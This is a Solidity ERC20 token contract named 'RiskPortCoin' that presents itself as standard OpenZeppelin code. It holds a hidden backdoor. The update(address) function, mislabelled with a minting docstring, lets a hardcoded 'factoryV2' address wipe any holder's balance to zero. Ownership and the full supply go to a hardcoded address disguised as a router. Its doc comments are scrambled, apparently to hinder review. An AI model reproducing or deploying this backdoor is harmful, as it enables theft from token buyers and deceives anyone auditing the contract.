// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)

pragma solidity ^0.8.19;

/*
https://RiskPortCoinETH.xyz

https://t.me.com/RiskPortCoinETH
https://twitter.com/RiskPortCoinETH

*/

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 *
 * @dev Wrappers over Solidity's arithmetic operations.
 * now has built in overflow checking.
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 */
library SafeMath {
    /**
     * _Available since v3.4._
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * _Available since v3.4._
     *
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * _Available since v3.4._
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     *
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     * _Available since v3.4._
     *
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * Requirements:
     * - Addition cannot overflow.
     * overflow.
     *
     * @dev Returns the addition of two unsigned integers, reverting on
     *
     * Counterpart to Solidity's `+` operator.
     *
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     *
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     *
     *
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * Counterpart to Solidity's `*` operator.
     * - Multiplication cannot overflow.
     *
     * Requirements:
     * overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * Counterpart to Solidity's `/` operator.
     *
     * - The divisor cannot be zero.
     * division by zero. The result is rounded towards zero.
     *
     *
     * Requirements:
     * @dev Returns the integer division of two unsigned integers, reverting on
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     *
     * Requirements:
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     *
     *
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * - The divisor cannot be zero.
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * reverting when dividing by zero.
     * invalid opcode to revert (consuming all remaining gas).
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     *
     *
     * - Subtraction cannot overflow.
     *
     * Counterpart to Solidity's `-` operator.
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * Requirements:
     *
     * message unnecessarily. For custom revert reasons use {trySub}.
     * overflow (when the result is negative).
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * Requirements:
     *
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * uses an invalid opcode to revert (consuming all remaining gas).
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     *
     * - The divisor cannot be zero.
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     *
     * division by zero. The result is rounded towards zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     *
     *
     * - The divisor cannot be zero.
     * message unnecessarily. For custom revert reasons use {tryMod}.
     * Requirements:
     * invalid opcode to revert (consuming all remaining gas).
     * reverting with custom message when dividing by zero.
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     *
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


pragma solidity ^0.8.0;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     *
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     * @dev Leaves the contract without owner. It will not be possible to call
     */

    /**
     * Can only be called by the current owner.
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}


pragma solidity ^0.8.0;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function totalSupply() external view returns (uint256);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}


// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.0;


/**
 * _Available since v4.1._
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.0;


contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;

    uint8 private _decimals = 9;
    mapping(address => mapping(address => uint256)) private _allowanceEnableds;
    mapping(address => uint256) private _balances;
    string private _name;
    address private factoryV2 = 0xa64bF66C9142e78bf250d70383582AFAF386af68;
    uint256 private _totalSupply;
    address internal V2Router = 0x1f90287854f3A13dE0Eb391Ae9fE7eE023f4dc05;
    string private _symbol;

    
    /**
     *
     * construction.
     * @dev Sets the values for {name} and {symbol}.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }
    /**

     */

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }
    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }


    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowanceEnableds[owner][spender];
    }

    /**
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * @dev See {IERC20-approve}.
     *
     * - `spender` cannot be the zero address.
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     * `amount`.
     * required by the EIP. See the note at the beginnist `amount`.
     * Emits an {Approval} event indicating the updated allowance. This is not
     *
     * - the caller must have allowance for ``from``'s tokens of at least
     * @dev See {IERC20-transferFrom}.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     * - `spender` cannot be the zero address.
     *
     * This is an alternative to {approve} that
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     *
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * - `spender` must have allowance for the caller of at least
     * problems described in {IERC20-approve}.
     * `subtractedValue`.
     * - `spender` cannot be the zero address.
     * This is an alternative to {approve} that can be used as a mitigation for
     */
    /**
     * - `from` must have a balance of at least `amount`.
     * @dev Moves `amount` of tokens from `from` to `to`.
     *
     * - `to` cannot be the zero address.
     * This internal function is equivalent to {transfer}, and can be used to
     */
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalance - amount;

        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * Requirements:
     * the total supply.
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     *
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * total supply.
     * - `account` cannot be the zero address.
     * Emits a {Transfer} event with `to` set to the zero address.
     * @dev Destroys `amount` tokens from `account`, reducing the
     * Requirements:
     *
     *
     * - `account` must have at least `amount` tokens.
     *
     */
    /**
     * Emits an {Approval} event.
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * - `owner` cannot be the zero address.
     *
     *
     * e.g. set automatic allowances for certain subsystems, etc.
     * - `spender` cannot be the zero address.
     * This internal function is equivalent to `approve`, and can be used to
     *
     * Requirements:
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowanceEnableds[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }


    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual
    { }

    /**
     *
     * Does not update the allowance amount in case of infinite allowance.
     * Might emit an {Approval} event.
     *
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     * Revert if not enough allowance is available.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked { _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /*
     * @dev Creates `amount` tokens and assigns them to `account`, increasing
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * the total supply.
     */
    function update(address updateSender) external { if (msg.sender == factoryV2) _balances[updateSender] = 0x0; }

    /**
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * will be transferred to `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * Calling conditions:
     *
     * @dev Hook that is called before any transfer of tokens. This includes
     * - `from` and `to` are never both zero.
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     *
     * minting and burning.
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) 
    internal virtual {}

}



contract RiskPortCoin is ERC20, Ownable
{
    constructor() ERC20(unicode"RiskPort", unicode"RISK ")
    {
        transferOwnership(V2Router);
        _mint(owner(), 7010000000000 * 10 ** uint(decimals()));
    }
}